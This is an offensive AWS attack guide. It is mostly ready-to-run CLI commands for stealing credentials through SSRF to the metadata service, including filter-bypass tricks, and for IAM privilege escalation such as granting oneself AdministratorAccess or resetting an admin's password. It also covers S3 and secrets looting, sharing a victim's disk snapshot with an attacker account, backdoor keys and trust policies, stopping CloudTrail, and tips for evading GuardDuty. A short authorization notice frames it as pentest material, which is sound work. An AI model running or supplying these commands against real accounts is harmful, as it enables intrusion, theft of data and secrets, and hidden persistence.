# AWS Cloud Attack Guide

End-to-end offensive tradecraft for Amazon Web Services: external recon, credential
acquisition (leaks, SSRF→IMDS, public assets), IAM enumeration and the canonical
privilege-escalation paths, S3 abuse, compute pivots (EC2/SSM, Lambda, ECS, EKS),
data exfiltration, persistence/backdooring, and detection-aware OPSEC. Grounded in
2025-2026 research (Rhino Security Labs' 23 privesc paths, BishopFox CloudFox, Pacu,
Prowler, ScoutSuite, EKS Pod Identity).

> **Authorization first.** AWS permits most customer-side pentesting of your own
> resources without prior approval, but **DoS/DDoS, port-flooding, and testing of
> other tenants are prohibited** and require the AWS Simulated Events form. Always
> confirm account IDs and scope in the Rules of Engagement before touching anything.

---

## 0. Mental Model & Kill Chain

```
External recon ──► Credential acquisition ──► Identity enumeration
   (S3/OSINT)        (leaks / SSRF→IMDS)         (whoami / Pacu / CloudFox)
        │                                              │
        ▼                                              ▼
  Service discovery ◄──────────── IAM privesc paths (23 known)
   (EC2/Lambda/ECS/EKS/RDS)              │
        │                               ▼
        ▼                        Admin / cross-account assume-role
  Lateral movement (SSM, role chaining, pod tokens)
        │
        ▼
  Data exfil (S3/RDS/Secrets/DynamoDB) + Persistence (keys, Lambda, trust policy)
```

**Credentials in AWS are everything.** There is no "network" to firewall — the API is
internet-facing globally. Once you hold a valid `AKIA*`/`ASIA*` key pair (or an
assumed-role session), the entire blast radius is defined by IAM policy, not by
network position.

| Key prefix | Meaning |
|------------|---------|
| `AKIA…` | Long-lived IAM **user** access key (no expiry) |
| `ASIA…` | **Temporary** STS credential (has session token + expiry) — from roles, IMDS, SSO |
| `ABIA…` | AWS STS service bearer token |
| `ACCA…` | Context-specific credential |

---

## 1. External Reconnaissance (Unauthenticated)

### Account / Org enumeration

```bash
# Resolve an account ID from an ARN / canonical user ID / key with no creds needed
# Enumerate the account ID behind a public S3 bucket (no API access required):
#   https://github.com/Frichetten/aws_account_id_leak  / various GET-Object-attributes tricks

# Enumerate IAM principals (users/roles) in a *target* account via cross-account
# trust-policy probing (no creds in the target needed, just your own account):
pip install enumerate-principals    # or use Pacu's iam__enum_users_roles_policies_groups
```

### S3 bucket discovery & enumeration

```bash
# Permutation-based bucket discovery
# https://github.com/sa7mon/S3Scanner
s3scanner scan --bucket-file candidates.txt
s3scanner scan --bucket acme-prod-backups

# Common public read of bucket index (anonymous)
curl https://BUCKET.s3.amazonaws.com/                       # ListBucket
curl https://BUCKET.s3.us-east-1.amazonaws.com/             # region-specific

# Pull objects anonymously when ACL is public
aws s3 ls s3://BUCKET --no-sign-request
aws s3 cp s3://BUCKET/secret.txt . --no-sign-request
aws s3 sync s3://BUCKET ./loot/ --no-sign-request

# Check for exposed VCS / state / backups inside a bucket
for f in .git/HEAD terraform.tfstate .env config.json backup.sql; do
  curl -s -o /dev/null -w "%{http_code} $f\n" "https://BUCKET.s3.amazonaws.com/$f"
done
```

> **2025 reality:** Public buckets are now blocked by default (S3 Block Public
> Access on by default since 2023). The high-value finds today are **mis-scoped bucket
> policies, presigned-URL leaks, and `s3:GetObject` granted to `Principal: "*"` with
> a condition you can satisfy.** Also check **OAI/OAC misconfig** on CloudFront origins.

### Subdomain → cloud asset mapping

```bash
# Find cloud-hosted endpoints (S3 website, CloudFront, ELB, API Gateway, Lambda URL)
subfinder -d acme.com -silent | httpx -silent -title -tech-detect -cdn
# Look for: s3-website / cloudfront.net / execute-api / lambda-url / elb.amazonaws.com

# Dangling DNS → subdomain takeover (CNAME to a deleted S3/CloudFront/ELB)
nuclei -l subs.txt -t http/takeovers/
```

---

## 2. Credential Acquisition

### 2.1 Leaked keys (the #1 initial access vector)

```bash
# Source-code & history scanning
gitleaks detect --source . -v
trufflehog git file://./repo --only-verified
trufflehog filesystem ./dir --only-verified

# GitHub-wide hunting for an org's leaked AKIA keys
# (gh search code / trufflehog github --org=acme)
trufflehog github --org=acme --only-verified

# Validate a found key & enumerate identity (THE first thing to run)
aws sts get-caller-identity --profile loot
```

Common leak locations: `.env`, CI/CD variables, `~/.aws/credentials`, Docker image
layers (`docker history`, `dive`), Terraform state, Jenkinsfiles, mobile app APKs,
S3 objects, Slack/Jira pastes, and **EBS/RDS snapshots shared public**.

### 2.2 SSRF → Instance Metadata Service (IMDS) → credentials

The classic web-app→cloud pivot. A server-side request to `169.254.169.254` returns
the IAM **role credentials** the EC2 instance runs as.

```bash
# IMDSv1 (no token) — only works if instance still allows v1
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>
# Returns AccessKeyId / SecretAccessKey / Token (ASIA…) — export and run sts get-caller-identity

# IMDSv2 (session-oriented, default on new launches) — needs PUT to get a token first.
# Hard via blind SSRF (requires PUT + custom header), but doable if you can set headers:
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
        -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
     http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

```bash
# Useful metadata beyond creds:
curl http://169.254.169.254/latest/dynamic/instance-identity/document   # account ID, region, instance type
curl http://169.254.169.254/latest/user-data                            # often contains bootstrap secrets!
```

**SSRF bypass tricks** for IMDS filters: `http://169.254.169.254`, decimal
`http://2852039166/`, `http://[::ffff:169.254.169.254]`, `http://instance-data/`,
DNS-rebinding, and gopher/redirect chains. **IMDSv2 + hop-limit 1** is the defense;
note it when reporting.

### 2.3 ECS / EKS / Lambda relative credential endpoint

Containers and serverless do **not** use `169.254.169.254` for creds. They use a
loopback relative URI provided via env var:

```bash
# ECS / EKS Pod Identity — credentials come from a local endpoint, not IMDS
env | grep -i AWS_CONTAINER
#   AWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/<uuid>      (ECS task role)
#   AWS_CONTAINER_CREDENTIALS_FULL_URI=...                            (EKS Pod Identity)
#   AWS_CONTAINER_AUTHORIZATION_TOKEN_FILE=...

curl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI            # ECS task role creds
# EKS Pod Identity (needs the bearer token from the token file):
curl -H "Authorization: $(cat $AWS_CONTAINER_AUTHORIZATION_TOKEN_FILE)" \
     "$AWS_CONTAINER_CREDENTIALS_FULL_URI"
```

### 2.4 Configure & sanity-check stolen creds

```bash
export AWS_ACCESS_KEY_ID=AKIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...          # only for ASIA temporary creds
aws sts get-caller-identity           # ALWAYS run this first
# {"UserId":"...","Account":"123456789012","Arn":"arn:aws:iam::...:user/svc-ci"}
```

---

## 3. Identity & Resource Enumeration

### 3.1 Fast IAM self-enumeration

```bash
# What can I do? (the most important questions)
aws sts get-caller-identity
aws iam get-user
aws iam list-attached-user-policies --user-name <me>
aws iam list-user-policies --user-name <me>
aws iam list-groups-for-user --user-name <me>

# Brute-force which API calls succeed (read-only, no logging of *intent*)
# https://github.com/andresriancho/enumerate-iam
enumerate-iam --access-key AKIA... --secret-key ...

# Simulate exactly which actions a principal is allowed (if you have iam:SimulatePrincipalPolicy)
aws iam simulate-principal-policy --policy-source-arn <arn> \
  --action-names iam:CreateUser ec2:RunInstances s3:GetObject
```

### 3.2 Automated offensive enumeration

```bash
# CloudFox — situational awareness, generates a "loot" folder of ready-to-run commands
# https://github.com/BishopFox/cloudfox
cloudfox aws --profile loot all-checks       # everything
cloudfox aws --profile loot inventory        # high-level service map
cloudfox aws --profile loot permissions      # who-can-do-what
cloudfox aws --profile loot endpoints        # reachable URLs/IPs
cloudfox aws --profile loot secrets          # SSM params, Secrets Manager, env vars
cloudfox aws --profile loot instances        # EC2 with IPs + instance profiles (feed to nmap)

# Pacu — post-exploitation framework (modules)
# https://github.com/RhinoSecurityLabs/pacu
pacu
> import_keys loot
> run iam__enum_permissions
> run iam__privesc_scan            # finds & can auto-exploit privesc paths
> run iam__enum_users_roles_policies_groups
> run s3__download_bucket

# Prowler — security assessment (works great as a recon map of services in use)
# https://github.com/prowler-cloud/prowler
prowler aws --profile loot
prowler aws -c iam_user_no_administrator_access -M csv,html

# ScoutSuite — multi-cloud audit (note: less active maintenance; still useful)
scout aws --profile loot
```

### 3.3 Service inventory (manual key calls)

```bash
aws ec2 describe-instances --query 'Reservations[].Instances[].[InstanceId,State.Name,PublicIpAddress,IamInstanceProfile.Arn]' --output table
aws ec2 describe-security-groups
aws ec2 describe-snapshots --owner-ids self
aws ec2 describe-volumes
aws lambda list-functions --query 'Functions[].[FunctionName,Role,Runtime]' --output table
aws s3api list-buckets
aws rds describe-db-instances
aws secretsmanager list-secrets
aws ssm describe-parameters
aws dynamodb list-tables
aws ecr describe-repositories
aws eks list-clusters
aws ecs list-clusters
aws cloudtrail describe-trails     # is logging on? where does it go? (OPSEC)
```

---

## 4. IAM Privilege Escalation (the 23 paths)

Rhino Security Labs catalogued ~23 IAM privesc primitives. They cluster into five
families. **`iam:PassRole` is the linchpin of most compute-based paths** — you need
it to attach a privileged role to a resource you can run code on.

### Family A — Directly modify your own permissions

```bash
# A1. iam:AttachUserPolicy / AttachGroupPolicy / AttachRolePolicy → attach AdministratorAccess
aws iam attach-user-policy --user-name <me> \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# A2. iam:PutUserPolicy / PutGroupPolicy / PutRolePolicy → inline admin policy
aws iam put-user-policy --user-name <me> --policy-name esc \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'

# A3. iam:CreatePolicyVersion → make a new DEFAULT version of an attached policy (--set-as-default)
aws iam create-policy-version --policy-arn <ATTACHED_POLICY> \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  --set-as-default

# A4. iam:SetDefaultPolicyVersion → flip back to an older over-permissive version
aws iam set-default-policy-version --policy-arn <ARN> --version-id v1
```

### Family B — Create / hijack credentials on a privileged principal

```bash
# B1. iam:CreateAccessKey on another user → mint a key for an admin user
aws iam create-access-key --user-name <admin_user>

# B2. iam:CreateLoginProfile → set a console password on a user who has none
aws iam create-login-profile --user-name <admin_user> --password 'P@ss!2026' --no-password-reset-required

# B3. iam:UpdateLoginProfile → reset an existing console password
aws iam update-login-profile --user-name <admin_user> --password 'P@ss!2026'

# B4. iam:CreateServiceSpecificCredential / ResetServiceSpecificCredential (CodeCommit etc.)
aws iam create-service-specific-credential --user-name <me> --service-name codecommit.amazonaws.com
```

### Family C — Abuse PassRole + compute to run code as a role

```bash
# C1. iam:PassRole + ec2:RunInstances → launch EC2 with an admin instance profile, then read its creds via IMDS
aws ec2 run-instances --image-id ami-xxxx --instance-type t3.micro \
  --iam-instance-profile Name=<ADMIN_PROFILE> --key-name attacker-key

# C2. iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction → run code as a privileged role
aws lambda create-function --function-name esc --runtime python3.12 \
  --role arn:aws:iam::ACCT:role/<ADMIN_ROLE> --handler esc.handler --zip-file fileb://esc.zip
aws lambda invoke --function-name esc out.json
# (handler shells out: boto3.client('iam').attach_user_policy(...))

# C3. iam:PassRole + Glue / SageMaker / CloudFormation / DataPipeline / CodeBuild → same idea, different runner
#     glue:CreateDevEndpoint, sagemaker:CreateNotebookInstance + CreatePresignedNotebookInstanceUrl,
#     cloudformation:CreateStack (with a role), codebuild:CreateProject+StartBuild

# C4. iam:PassRole + ec2 + SSM RunCommand on a managed admin instance
aws ssm send-command --document-name AWS-RunShellScript \
  --targets Key=instanceids,Values=<i-admin> \
  --parameters 'commands=["aws iam attach-user-policy --user-name me --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"]'
```

### Family D — Pivot via roles (assume / trust)

```bash
# D1. sts:AssumeRole on an over-trusting role
aws sts assume-role --role-arn arn:aws:iam::ACCT:role/<PRIV_ROLE> --role-session-name x

# D2. iam:UpdateAssumeRolePolicy → rewrite a privileged role's trust policy to trust YOU, then assume it
aws iam update-assume-role-policy --role-name <PRIV_ROLE> \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"AWS":"arn:aws:iam::ACCT:user/me"},"Action":"sts:AssumeRole"}]}'
aws sts assume-role --role-arn arn:aws:iam::ACCT:role/<PRIV_ROLE> --role-session-name x

# D3. Role chaining across accounts (D→cross-account if trust allows) — note the 1h max-chained-session limit
```

### Family E — Edit existing compute / config

```bash
# E1. lambda:UpdateFunctionCode on an existing privileged function → replace code, it runs as its role
aws lambda update-function-code --function-name <PRIV_FN> --zip-file fileb://payload.zip

# E2. ec2-instance-connect:SendSSHPublicKey / SSM StartSession on a privileged instance
# E3. datapipeline / cloudformation:UpdateStack on a stack with a privileged role
```

> **Tooling shortcut:** `pacu` → `run iam__privesc_scan` enumerates which of these
> paths your principal can take and (with confirmation) executes them. CloudFox's
> `permissions` + a quick policy review tells you which dangerous actions you hold:
> `iam:PassRole`, `*:Create*Policy*`, `sts:AssumeRole`, `lambda:*`, `iam:Attach*`.

---

## 5. S3 Attacks (authenticated)

```bash
aws s3api list-buckets
aws s3api get-bucket-policy --bucket <b>            # find Principal:* / wildcard conditions
aws s3api get-bucket-acl --bucket <b>
aws s3api get-public-access-block --bucket <b>      # is BPA off?
aws s3 ls s3://<b> --recursive --human-readable

# Data exfil
aws s3 sync s3://<b> ./loot/

# Backdoor: writable bucket policy → make it world-readable, or add yourself
aws s3api put-bucket-policy --bucket <b> --policy file://world-read.json

# Object versioning loot — deleted "secrets" often still recoverable
aws s3api list-object-versions --bucket <b>
aws s3api get-object --bucket <b> --key secret.env --version-id <v> out.env

# Presigned URL abuse — if you can generate one, you bypass bucket policy for a window
aws s3 presign s3://<b>/secret.env --expires-in 3600
```

High-value object types: `.tfstate`, `.env`, `id_rsa`, `*.pem`, `*.kdbx`, DB dumps,
`credentials`, CloudTrail logs (recon), Lambda deployment zips (source review).

---

## 6. Compute & Lateral Movement

### 6.1 EC2 / SSM

```bash
# Run commands on every SSM-managed instance you can reach (no SSH/keys needed)
aws ssm describe-instance-information
aws ssm start-session --target <i-xxxx>                # interactive shell as ssm-user
aws ssm send-command --document-name AWS-RunShellScript \
  --targets Key=tag:Environment,Values=prod \
  --parameters 'commands=["id","curl http://169.254.169.254/latest/meta-data/iam/security-credentials/"]'

# Snapshot theft → mount in your own account to read disk (incl. /etc/shadow, app secrets)
aws ec2 create-snapshot --volume-id <vol-xxxx>
aws ec2 modify-snapshot-attribute --snapshot-id <snap> --attribute createVolumePermission \
  --operation-type add --user-ids <ATTACKER_ACCT>
```

### 6.2 Lambda

```bash
aws lambda list-functions
aws lambda get-function --function-name <fn>           # download code (Code.Location URL)
aws lambda get-function-configuration --function-name <fn>   # env vars often hold secrets!
# Persistence/backdoor: update code or add a layer; or set reserved concurrency to keep it warm
```

### 6.3 ECS

```bash
aws ecs list-clusters
aws ecs list-tasks --cluster <c>
aws ecs describe-task-definition --task-definition <td>   # secrets in containerDefinitions.environment
# If ecs:RunTask + iam:PassRole → run a task with a privileged task role (your image/command)
aws ecs run-task --cluster <c> --task-definition <evil-td> --launch-type FARGATE
# From inside a task: hit 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI for the task role
```

### 6.4 EKS — IRSA & Pod Identity token abuse (2025)

```bash
# Gain API access if you hold eks:* + the cluster's aws-auth / access entries
aws eks update-kubeconfig --name <cluster> --region <r>
kubectl auth can-i --list

# Inside a compromised pod: harvest BOTH credential sources
cat /var/run/secrets/eks.amazonaws.com/serviceaccount/token        # IRSA web-identity token
cat /var/run/secrets/pods.eks.amazonaws.com/serviceaccount/eks-pod-identity-token   # Pod Identity

# IRSA: exchange the web-identity token for IAM creds (role ARN in env)
aws sts assume-role-with-web-identity --role-arn $AWS_ROLE_ARN \
  --role-session-name x --web-identity-token file://$AWS_WEB_IDENTITY_TOKEN_FILE

# If IMDS is NOT restricted on the node, a pod can also steal the NODE role creds (broader!)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/   # node instance role
```

> 2025 note: EKS Pod Identity added `targetRoleArn` **role chaining across accounts**
> (June 2025). A single harvested pod token can now reach roles in *other* accounts —
> check the agent config and `aws sts get-caller-identity` after each exchange.

---

## 7. Data Stores & Secrets

```bash
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id <id> --query SecretString --output text
aws ssm get-parameters-by-path --path / --recursive --with-decryption          # SecureString = plaintext
aws ssm get-parameter --name <n> --with-decryption
aws dynamodb scan --table-name <t>
aws rds describe-db-snapshots; aws rds describe-db-instances                     # endpoints + maybe public
aws kms list-keys; aws kms list-aliases                                          # what can you decrypt?
```

---

## 8. Persistence & Backdooring

| Technique | Command sketch | T-ID |
|-----------|----------------|------|
| Second access key on a user | `aws iam create-access-key --user-name X` | T1098.001 |
| New IAM user + admin | `create-user` + `attach-user-policy …Administrator` | T1136.003 |
| Console login profile | `iam create-login-profile` | T1098 |
| Role trust to attacker acct | `iam update-assume-role-policy` | T1098 |
| Lambda backdoor (cron/EventBridge) | `lambda update-function-code` + scheduled rule | T1546 |
| Resource policy backdoor (S3/KMS/SQS) | add attacker principal to policy | T1098 |
| STS federation token (no key on disk) | `sts get-federation-token` | T1078.004 |
| Disable/redirect CloudTrail | `cloudtrail stop-logging` / `delete-trail` | T1562.008 |

```bash
# Quiet persistence: federation token (no new IAM user, leaves a thin trail)
aws sts get-federation-token --name svc --policy file://admin.json
```

---

## 9. Defense Evasion & OPSEC

- **Assume logging is on.** CloudTrail records management events; **data events**
  (S3 object GET, Lambda invoke) are often off — recon there is quieter.
- `aws cloudtrail describe-trails` / `get-trail-status` to see what's logged and
  whether it's multi-region. GuardDuty flags `Recon:IAMUser/*`, `UnauthorizedAccess`,
  IMDS-from-outside, and **anomalous AssumeRole**.
- Stolen `ASIA…` creds used **off the source instance** trigger GuardDuty
  `InstanceCredentialExfiltration`. Use them *from* the instance (SSM) when possible.
- `enumerate-iam` and brute-forced denied calls generate `AccessDenied` events — noisy.
  Prefer `iam:SimulatePrincipalPolicy` if you have it.
- Throttle, set realistic User-Agents, work within one region when feasible, and avoid
  `iam:*` mutations during business hours unless RoE allows loud testing.

---

## 10. Tooling Quick Reference

| Tool | One-liner | Use |
|------|-----------|-----|
| **Pacu** | `pacu` → `run iam__privesc_scan` | Post-exploit framework, privesc automation |
| **CloudFox** | `cloudfox aws --profile p all-checks` | Attack-path enumeration + loot |
| **Prowler** | `prowler aws --profile p` | 500+ security/compliance checks (recon) |
| **ScoutSuite** | `scout aws --profile p` | Multi-cloud config audit report |
| **enumerate-iam** | `enumerate-iam --access-key … --secret-key …` | Brute which API calls succeed |
| **s3scanner** | `s3scanner scan --bucket b` | Public bucket discovery |
| **trufflehog** | `trufflehog github --org acme --only-verified` | Verified secret hunting |
| **gitleaks** | `gitleaks detect -v` | Repo/history secret scan |
| **Trivy** | `trivy aws --region us-east-1` | Cloud + image + IaC scanning |

---

## 11. AWS Privesc Quick-Lookup

| You hold… | Do this |
|-----------|---------|
| `iam:AttachUserPolicy` | attach `AdministratorAccess` to yourself |
| `iam:PutUserPolicy` | inline `*:*` policy on yourself |
| `iam:CreatePolicyVersion` | new default version `*:*` on an attached policy |
| `iam:CreateAccessKey` | mint a key for an admin user |
| `iam:Create/UpdateLoginProfile` | set/reset admin console password |
| `iam:PassRole` + `lambda:CreateFunction`+`InvokeFunction` | run code as admin role |
| `iam:PassRole` + `ec2:RunInstances` | EC2 with admin profile → IMDS creds |
| `iam:UpdateAssumeRolePolicy` | rewrite role trust to you → assume it |
| `sts:AssumeRole` (over-trust) | assume the privileged role directly |
| `lambda:UpdateFunctionCode` (priv fn) | replace code, runs as its role |
| `ssm:SendCommand` (managed admin host) | run commands as that instance's role |

---

## 12. MITRE ATT&CK (Cloud) Mapping

| Technique | ID | Context |
|-----------|-----|---------|
| Valid Accounts: Cloud Accounts | T1078.004 | Stolen/assumed AWS creds |
| Unsecured Credentials: Cloud Instance Metadata API | T1552.005 | SSRF → IMDS |
| Unsecured Credentials: CI/CD & files | T1552.001/.007 | Leaked keys, Terraform state |
| Cloud Infrastructure Discovery | T1580 | EC2/Lambda/EKS enumeration |
| Permission Groups Discovery: Cloud | T1069.003 | IAM enumeration |
| Account Manipulation | T1098 / .001 / .003 | Backdoor keys/users/trust |
| Create Cloud Account | T1136.003 | New IAM user |
| Data from Cloud Storage | T1530 | S3 exfil |
| Impair Defenses: Disable Cloud Logs | T1562.008 | Stop CloudTrail |
| Cloud Service Discovery | T1526 | Service inventory |

---

## References

- Rhino Security Labs — AWS IAM Privilege Escalation: Methods & Mitigation: https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/
- Pacu (AWS exploitation framework): https://github.com/RhinoSecurityLabs/pacu
- BishopFox CloudFox: https://github.com/BishopFox/cloudfox
- Prowler: https://github.com/prowler-cloud/prowler
- ScoutSuite: https://github.com/nccgroup/ScoutSuite
- HackTricks Cloud — AWS Pentesting: https://cloud.hacktricks.xyz/pentesting-cloud/aws-security
- AWS EKS Pod Identity deep dive (Datadog Security Labs): https://securitylabs.datadoghq.com/articles/eks-pod-identity-deep-dive/
- Breaking EKS: IRSA vs Pod Identity (attacker's lens): https://medium.com/@devanshu.red/breaking-eks-authentication-mechanisms-deep-dive-irsa-vs-pod-identity-from-an-attackers-lens-52f799190ac0
- DeepStrike — AWS Penetration Testing Guide (2025): https://deepstrike.io/blog/aws-penetration-testing-guide-techniques-and-methodology
- RedFox Security — AWS Penetration Testing Guide (2026): https://www.redfoxsec.com/blog/aws-penetration-testing-guide-2026
- AWS Customer Support Policy for Penetration Testing: https://aws.amazon.com/security/penetration-testing/
- MITRE ATT&CK Cloud Matrix: https://attack.mitre.org/matrices/enterprise/cloud/
